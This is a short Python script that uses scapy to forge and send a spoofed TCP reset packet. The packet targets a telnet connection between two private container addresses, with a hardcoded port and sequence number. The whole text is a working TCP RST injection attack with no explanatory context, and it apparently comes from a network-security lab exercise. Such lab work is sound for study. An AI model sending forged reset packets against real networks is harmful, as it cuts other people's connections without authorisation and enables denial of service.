from scapy.all import *
print("sending reset packet")
ip = IP(src="172.17.0.2",dst="172.17.0.3")
tcp = TCP(sport=23,dport=49064,flags="R",seq=1565829183)
pkt=ip/tcp 
ls(pkt)
send(pkt,verbose=0)
